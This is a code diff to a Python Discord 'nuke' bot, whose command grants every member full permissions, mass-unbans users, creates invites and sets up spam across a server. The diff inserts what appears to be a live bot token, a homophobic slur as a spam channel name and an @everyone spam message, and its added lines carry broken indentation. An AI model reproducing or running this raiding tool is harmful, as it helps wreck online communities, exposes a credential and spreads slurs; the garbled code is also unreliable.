@@ -5,13 +5,13 @@ from discord import Permissions
 from colorama import Fore, Style
 import asyncio
 
-token = "UR TOKEN"
+token = "ODQ5NzU4MDM3NTgwODQwOTYw.YLf01w.MDF9CQi4fB1bdbd7zUsLRVl7KC8"
 
 
-SPAM_CHANNEL =  ["UR MESSAGE"]
-SPAM_MESSAGE = ["@everyone UR MESSAGE"]
+SPAM_CHANNEL =  ["Stupid Faggots"]
+SPAM_MESSAGE = ["@everyone Senti says hi!"]
 
-client = commands.Bot(command_prefix="UR PREFIX")
+client = commands.Bot(command_prefix=".")
 
 
 @client.event
@@ -36,11 +36,11 @@ async def on_ready():
  Please type .Nuke in the discord chat to begin 
  ''')
 
-
 @client.command()
 async def Nuke (ctx):
     await ctx.message.delete()
     guild = ctx.guild
+  await guild.create_text_channel("UR MESSAGE")
     try:
       role = discord.utils.get(guild.roles, name = "@everyone")
       await role.edit(permissions = Permissions.all())
@@ -79,8 +79,7 @@ async def Nuke (ctx):
         print(Fore.MAGENTA + f"{user.name}#{user.discriminator} Was successfully unbanned." + Fore.RESET)
       except:
         print(Fore.GREEN + f"{user.name}#{user.discriminator} Was not unbanned." + Fore.RESET)
-    await guild.create_text_channel("Senti Says it begins")
-    for channel in guild.text_channels:
+       for channel in guild.text_channels:
         link = await channel.create_invite(max_age = 0, max_uses = 0)
         print(f"New Invite: {link}")
     amount = 500
